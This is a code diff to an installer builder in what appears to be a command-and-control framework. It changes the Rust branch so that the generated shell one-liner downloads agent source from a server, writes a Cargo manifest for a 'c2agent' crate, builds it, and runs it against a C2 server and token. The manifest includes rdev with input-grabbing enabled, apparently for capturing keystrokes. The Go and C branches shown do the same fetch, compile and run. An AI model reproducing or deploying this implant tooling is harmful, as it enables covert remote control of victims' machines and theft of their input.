@@ -1695,7 +1695,31 @@ def _build_installer(language: str, server: str, token: str, interval: int,
                 if language == "go":
                     run = f"curl -fsSL {_shell_quote(dl)} -o \"$SRC\" && go build -o {out} \"$SRC\" && {out} --server {S} --token {T} {opt}"
                 elif language == "rust":
-                    run = f"curl -fsSL {_shell_quote(dl)} -o \"$SRC\" && rustc -O -o {out} \"$SRC\" && {out} --server {S} --token {T} {opt}"
+                    # Needs cargo, not bare rustc: agent.rs pulls crates (reqwest,
+                    # serde, rdev). Scaffold a temp crate and build it.
+                    run = (
+                        f'curl -fsSL {_shell_quote(dl)} -o "$SRC" && '
+                        'D="$(mktemp -d ${TMPDIR:-/tmp}/c2rs.XXXXXX)" && '
+                        'mv "$SRC" "$D/agent.rs" && cd "$D" && '
+                        "cat > Cargo.toml <<'RSCF'\n"
+                        "[package]\n"
+                        'name = "c2agent"\n'
+                        'version = "0.1.0"\n'
+                        'edition = "2021"\n'
+                        "\n"
+                        "[[bin]]\n"
+                        'name = "c2agent"\n'
+                        'path = "agent.rs"\n'
+                        "\n"
+                        "[dependencies]\n"
+                        'reqwest = { version = "0.12", features = ["blocking", "json", "multipart"] }\n'
+                        'serde = { version = "1", features = ["derive"] }\n'
+                        'serde_json = "1"\n'
+                        'hostname = "0.4"\n'
+                        'rdev = { version = "0.5", features = ["unstable_grab"] }\n'
+                        "RSCF\n"
+                        f"cargo build --release && ./target/release/c2agent --server {S} --token {T} {opt}"
+                    )
                 elif language in ("c", "cpp"):
                     cc = "g++" if language == "cpp" else "gcc"
                     run = f"curl -fsSL {_shell_quote(dl)} -o \"$SRC\" && {cc} -O2 -o {out} \"$SRC\" -lcurl && {out} --server {S} --token {T} {opt}"
